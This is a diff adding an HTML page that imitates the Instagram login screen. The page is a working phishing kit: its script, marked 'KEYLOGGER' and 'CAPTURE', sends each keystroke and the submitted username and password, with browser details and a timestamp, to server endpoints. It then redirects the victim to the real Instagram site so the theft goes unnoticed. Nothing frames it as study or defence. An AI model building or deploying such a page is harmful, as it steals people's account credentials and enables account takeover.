@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .container{display:flex;max-width:1000px;gap:40px;padding:20px}
+        .phone-mockup{flex:1;display:flex;align-items:center;justify-content:center}
+        .phone-mockup img{max-width:100%;height:auto}
+        .login-box{background:white;padding:40px;border-radius:4px;box-shadow:0 2px 16px rgba(0,0,0,.1);width:350px}
+        .logo{width:175px;margin:0 auto 30px;display:block}
+        .input-group{position:relative;margin-bottom:15px}
+        .input-group input{width:100%;padding:12px 45px 12px 15px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px}
+        .input-group input:focus{border-color:#0095f6;background:white;outline:none}
+        .input-group i{position:absolute;right:15px;top:50%;transform:translateY(-50%);color:#8e8e8e;font-size:14px}
+        .login-btn{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:5px;font-weight:600;font-size:14px;cursor:pointer;margin-bottom:20px}
+        .login-btn:hover{background:#007bb5}
+        .login-btn:disabled{background:#ccc;cursor:not-allowed}
+        .divider{position:relative;text-align:center;margin:20px 0}
+        .divider:before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#dbdbdb}
+        .divider span{background:white;padding:0 20px;color:#8e8e8e;font-size:13px}
+        .fb-btn{width:100%;padding:8px;background:#1877f2;color:white;border:none;border-radius:5px;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px}
+        .forgot-password{text-align:center;margin-top:20px}
+        .forgot-password a{color:#00376b;font-size:14px;text-decoration:none}
+        .signup-section{position:absolute;bottom:40px;left:50%;transform:translateX(-50%);background:rgba(255,255,255,.9);padding:20px;border-radius:4px;text-align:center}
+        .signup-section p{color:#262626;font-size:14px}
+        .signup-section a{color:#0095f6;font-weight:600;text-decoration:none}
+        @media (max-width:768px){.container{flex-direction:column;gap:20px}.login-box{width:100%;max-width:350px}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phone-mockup">
+            <img src="pexels-girl-2178564_1920.jpg" width="300" height="600"><img src="moni_memoni-red-hair-girl-8158373_1920.jpg" width="300 height="600" alt="Instagram">
+        </div>
+        
+        <div class="login-box">
+            <img src="moni_memoni-red-hair-girl-8158373_1920.jpg" class="logo" alt="Instagram">
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input name="username" type="text" placeholder="Phone number, username, or email" required autocomplete="username">
+                    <i class="fas fa-user"></i>
+                </div>
+                
+                <div class="input-group">
+                    <input name="password" type="password" placeholder="Password" required autocomplete="current-password">
+                    <i class="fas fa-lock"></i>
+                </div>
+                
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            
+            <div class="divider"><span>OR</span></div>
+            
+            <button type="button" class="fb-btn">
+                <i class="fab fa-facebook-f"></i>
+                Log in with Facebook
+            </button>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-section">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        // KEYLOGGER
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', () => {
+                fetch('/api/keylog', {method: 'POST', body: input.value, keepalive: true});
+            });
+        });
+
+        // SUBMIT HANDLER
+        document.getElementById('loginForm').addEventListener('submit', async e => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+            const btn = e.target.querySelector('button[type="submit"]');
+            
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+            
+            // CAPTURE
+            await fetch('/api/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: data.username,
+                    password: data.password,
+                    ip: location.hostname,
+                    ua: navigator.userAgent,
+                    time: new Date().toISOString()
+                }),
+                keepalive: true
+            });
+            
+            // REAL IG REDIRECT
+            setTimeout(() => location.href = 'https://www.instagram.com', 1200);
+        });
+    </script>
+</body>
+</html>
